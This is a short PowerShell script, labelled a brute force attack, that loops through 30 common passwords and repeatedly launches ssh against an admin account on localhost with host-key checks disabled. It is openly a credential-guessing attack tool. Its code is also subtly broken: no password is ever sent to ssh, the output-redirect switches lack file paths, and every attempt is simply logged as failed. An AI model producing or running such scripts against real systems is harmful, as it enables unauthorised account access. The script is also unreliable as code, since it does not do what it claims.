# Brute force attack script
$passwords = @("admin", "password", "123456", "root", "test", "user", "guest", "administrator", "admin123", "password123", "12345", "qwerty", "letmein", "welcome", "monkey", "dragon", "master", "hello", "login", "pass", "1234", "abc123", "111111", "iloveyou", "sunshine", "princess", "football", "charlie", "aa123456", "donald")
$hostname = "localhost"
$username = "admin"

Write-Host "Starting brute force attack on $hostname with user $username"
Write-Host "Total attempts: 30"

for ($i = 0; $i -lt 30; $i++) {
    $password = $passwords[$i % $passwords.Length]
    Write-Host "Attempt $($i+1): Trying password '$password'"
    
    try {
        # Use ssh with timeout and error handling
        $process = Start-Process -FilePath "ssh" -ArgumentList "-o", "ConnectTimeout=3", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-o", "LogLevel=ERROR", "-o", "PasswordAuthentication=yes", "$username@$hostname" -PassThru -NoNewWindow -RedirectStandardOutput -RedirectStandardError
        
        # Wait for connection attempt
        Start-Sleep -Seconds 1
        
        # Kill process if still running
        if (-not $process.HasExited) {
            $process.Kill()
        }
        
        Write-Host "Failed attempt $($i+1)"
    } catch {
        Write-Host "Connection failed attempt $($i+1)"
    }
    
    # Small delay between attempts
    Start-Sleep -Milliseconds 200
}

Write-Host "Brute force attack completed"
